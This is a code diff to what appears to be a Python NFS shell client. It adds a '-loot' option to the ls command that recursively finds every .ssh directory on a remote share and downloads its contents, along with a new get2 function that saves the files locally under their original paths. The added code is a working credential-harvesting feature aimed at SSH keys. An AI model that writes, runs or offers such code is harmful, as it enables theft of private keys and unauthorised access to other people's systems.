@@ -94,16 +94,21 @@ class Commands(object):
         print os.getcwd()
 
     def ls(self, *args):
-        """ls [-r] [<filename> ...]
+        """ls [-r] [-loot] [<filename> ...]
 
         Print info about <filename>. <filename> defaults to '.'.
         Columns are Mode, UID, GID, Size, Mtime, and Name.
-        '-r' enables recursive listing."""
+        '-r' enables recursive listing.
+        '-loot' finds all .ssh folders recursively and loots them."""
         tolist = list(args)
         recursive = False
+        loot = False
         if "-r" in tolist:
             recursive = True
             tolist.remove("-r")
+        if "-loot" in tolist:
+            loot = True
+            tolist.remove("-loot")
         if not tolist:
             tolist.append(".")
         while tolist:
@@ -114,7 +119,8 @@ class Commands(object):
             try:
                 if self.shell.isdir(f):
                     dirname = f
-                    print "{0}:".format(dirname)
+                    if not loot:
+                        print "{0}:".format(dirname)
                     lines = self.shell.spy.readdir(f,0)
                 else:
                     dirname = path.dirname(f)
@@ -123,9 +129,15 @@ class Commands(object):
                     name = entry[1]
                     fullname = path.join(dirname, name)
                     attr = self.shell.spy.getattr(fullname)
-                    if stat.S_ISDIR(attr.st_mode):
+
+                    # ugly patched recursive check
+                    if self.shell.isdir(fullname):
+                    #if bool(attr.st_mode == 0b111000000):
+                    #if stat.S_ISDIR(attr.st_gid):
                         if recursive and name != "." and name != "..":
-                            tolist.append(fullname)
+                            if fullname != filename:
+                                tolist.append(fullname)
+
                     elif stat.S_ISLNK(attr.st_mode):
                         dest = "<error>"
                         try:
@@ -133,10 +145,17 @@ class Commands(object):
                         except IOError as e:
                             report(e)
                         name = "{0} -> {1}".format(name, dest)
-                    print "{mode:06o} {uid: >6} {gid: >6} {size: >11} {date!s} {name}".format(
+
+                    if loot == True and dirname.endswith(".ssh"):
+                        if name != "." and name != "..":
+                            try:
+                                print fullname
+                                self.get2(fullname, None)
+                            except:
+                                raise
+                    elif loot != True:
+                        print "{mode:06o} {size: >11} {date!s} {name}".format(
                             mode=attr.st_mode,
-                            uid=attr.st_uid,
-                            gid=attr.st_gid,
                             size=attr.st_size,
                             date=datetime.fromtimestamp(attr.st_mtime),
                             name=name
@@ -147,6 +166,35 @@ class Commands(object):
 
     def cat(self,filename):
         return self.get(filename,"-")
+
+    def get2(self, filename, localname=None):
+        """get2 <filename> [<localname>]
+
+        Retrieve <filename> and save to <localname> folder. If no <localname> is given,
+        defaults to the current local working directory."""
+        f = self.shell.canonicalize(filename)
+        size = self.shell.spy.getattr(f).st_size
+        if localname=="-":
+            out=sys.stdout
+        else:
+            if localname and os.path.isdir(localname):
+                localname = os.path.normpath(os.path.join(localname, path.basename(f)))
+            localname = localname or os.getcwd()
+            dest = localname+f
+            if not os.path.exists(os.path.dirname(dest)):
+                try:
+                    os.makedirs(os.path.dirname(dest))
+                except OSError as exc: # Guard against race condition
+                    if exc.errno != errno.EEXIST:
+                        raise
+
+            out = open(dest, "w")
+        bsize = self.shell.spy.rtsize
+        for offset in range(0, size, bsize):
+            out.write( self.shell.spy.read(f, bsize, offset) )
+        if out!=sys.stdout:
+            out.close()
+
     def get(self, filename, localname=None):
         """get <filename> [<localname>]
 
